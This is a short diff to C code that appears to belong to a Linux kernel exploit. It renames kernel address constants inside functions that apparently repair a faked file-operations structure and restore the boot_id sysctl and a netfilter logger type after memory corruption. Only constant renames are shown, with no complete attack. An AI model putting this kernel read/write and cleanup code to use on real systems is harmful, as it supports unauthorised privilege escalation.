@@ -196,7 +196,7 @@ int repair_fake_fops_llseek(int fd) {
 
 int restore_slide_boot_id(int fd) {
   uintptr_t boot_id_data_ptr =
-      SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR + slide_p0_offset;
+      SLIDE_RANDOM_BOOT_ID_DATA + slide_p0_offset;
   slide_bootid_want = slide_canon_addr(SLIDE_SYSCTL_BOOTID);
   configfs_read_once(
       fd, boot_id_data_ptr, &slide_bootid_before, sizeof(slide_bootid_before));
@@ -216,7 +216,7 @@ int restore_slide_boot_id(int fd) {
       slide_bootid_after == slide_bootid_want;
 
 #ifdef SLIDE_RB_PARENT_TYPE_RESTORE
-  uintptr_t parent_type = SLIDE_NFULNL_LOGGER_OBJECT + slide_p0_offset +
+  uintptr_t parent_type = SLIDE_LOGGERS_0_1 + slide_p0_offset +
                           sizeof(uint64_t);
   uint64_t type_before = 0;
   uint64_t type_after = 0;
